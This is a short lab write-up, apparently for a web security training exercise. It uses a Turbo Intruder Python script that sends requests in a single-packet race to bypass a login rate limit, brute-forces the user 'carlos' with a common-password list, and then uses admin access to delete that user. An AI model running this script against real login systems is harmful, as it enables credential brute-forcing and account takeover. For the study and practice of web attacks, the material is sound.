
Just write up using Turbo Intruder to bypass the rate limit and brute force the password for the admin account.

Firstly, we need to enumerate behavior of the login page. If we try 3 incorrect passwords, we will be rate limited. We can use Turbo Intruder to bypass this rate limit and brute force the password for the admin account.

1. First, intercept the request to the login page and send it to Turbo Intruder.
2. Then, set the script to the following:


```python
words = ['123123', 'abc123', 'football', 'monkey', 'letmein', 'shadow', 'master', '666666', 'qwertyuiop', 
'123321', 'mustang', '123456', 'password', '12345678', 'qwerty', '123456789', '12345', '1234', '111111', 
'1234567', 'dragon', '1234567890', 'michael', 'x654321', 'superman', '1qaz2wsx', 'baseball', '7777777', '121212', '000000']

def queueRequests(target, wordlists):
    
    # if the target supports HTTP/2, use engine=Engine.BURP2 to trigger the single-packet attack
    # if they only support HTTP/1, use Engine.THREADED or Engine.BURP instead
    # for more information, check out https://portswigger.net/research/smashing-the-state-machine
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2
                           )

    # the 'gate' argument withholds part of each request until openGate is invoked
    # if you see a negative timestamp, the server responded before the request was complete
    for word in words:
        engine.queue(target.req, word, gate='race1')

    # once every 'race1' tagged request has been queued
    # invoke engine.openGate() to send them in sync
    engine.openGate('race1')


def handleResponse(req, interesting):
    table.add(req)
```

3. In request window in Turbo Intruder, set the payload position to the password field using the `%s`. Like that `csrf=Z4YPaD6zVNaUqk6YrFOye8rYbQDyqIzf&username=carlos&password=%s`
4. Run the script and wait for the password to be found. Find the response with status code 302 and use password to login as the admin.
5. Delete carlos from admin panel.